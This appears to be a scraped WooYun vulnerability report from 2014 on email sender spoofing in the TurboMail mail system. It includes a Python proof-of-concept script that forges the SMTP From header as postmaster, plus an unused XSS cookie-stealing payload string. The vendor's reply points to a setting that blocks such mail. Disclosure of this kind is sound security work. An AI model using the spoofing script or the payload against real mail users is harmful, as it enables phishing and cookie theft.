{"id": 50377, "wybug_id": "wooyun-2014-077987", "wybug_title": "TurboMail邮件系统伪造邮件漏洞,可实施邮件钓鱼", "wybug_corp": "turbomail.org", "wybug_author": "路人甲", "wybug_date": "2014-10-08 16:47", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-08：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： TurboMail邮件系统存在邮件伪造漏洞，可实施邮件钓鱼攻击.. 详细说明：  TurboMail邮件系统在发送邮件时没有对邮件协议的From字段进行有效验证，发件人可以伪造任意用户进行发送邮件，达到邮件欺骗攻击的目的，可以用来进行邮件钓鱼等。TurboMail邮件系统下载链接：http://www.turbomail.org/download.html测试环境：Win2003 + turbomail_win_520.exe   漏洞证明：  本地安装Windows版本的TurboMail邮件系统1）使用邮件系统管理用户添加2个测试账号test1@test.com和test2@test.com\n\n2)漏洞利用代码这里直接贴上利用脚本：\n这里直接贴上利用脚本：#!/user/bin/pythonimport smtplibimport datetimeMailTemplate = '''From: {From}\\nTo: {To}\\nSubject: {Subject}\\nDate: {Date}\\nContent-type: {ContentType}\\n\\n{Msg}\\r\\n\\r\\n'''payload = \"\"\"<img/src/onerror=alert(document.cookie)>\"\"\"def SendTurboMail(Server,Username,Password,Sender,Reciever,MailMsg):    try:        SmtpObj = smtplib.SMTP(Server)        SmtpObj.login(Username, Password)        print 'Sending Email'        SmtpObj.sendmail(Sender, Reciever, MailMsg)    except Exception:        print \"Error: unable to send email\"        return False        print \"Successfully sent email\"        SmtpObj.quit()if __name__ == '__main__':    server = '192.168.43.132'    username = 'test1@test.com'    password = 'qwerty123456'    sender = 'test1@test.com'    reciever = 'test2@test.com'    subject = 'fake sender'    date = datetime.datetime.now().strftime(\"%a, %d %b %Y %H:%M:%S +0800\")    msg = 'this a mail from ' + sender    frm = 'postmaster'+'<postmaster@root.com>'      #fake sender    #frm = 'test1'+'<'+sender+'>'    to = 'test2'+'<'+reciever+'>'    mailmsg = MailTemplate.format(From=frm,To=to,Subject=subject,Date=date,ContentType='text/html',Msg=msg)    SendTurboMail(server, username, password,sender,reciever,mailmsg)\n利用脚本实现的功能：使用账号test1@test.com（密码：qwerty123456）登录邮件系后，伪造邮件报文的frm<发送人>字段，并将邮件发送给test2@test.com用户，由于Turbomail邮件系统未对frm字段进行严格的验证，导致test2@test.com登录邮件系统后会收到一封发件人为postmaster<postmaster@root.com>管理员发送来的邮件利用演示：1）test1@test.com成功发送一封伪造frm字段的邮件给test2@test.com\n\n2) test2@test.com登录邮件系统后，收到了这封test1@test.com发送的伪造邮件\n\n   修复方案：  加强对邮件协议frm字段的验证   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复： 在系统设置-》smtp服务 可以启动对这类伪装邮件地址的判断 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}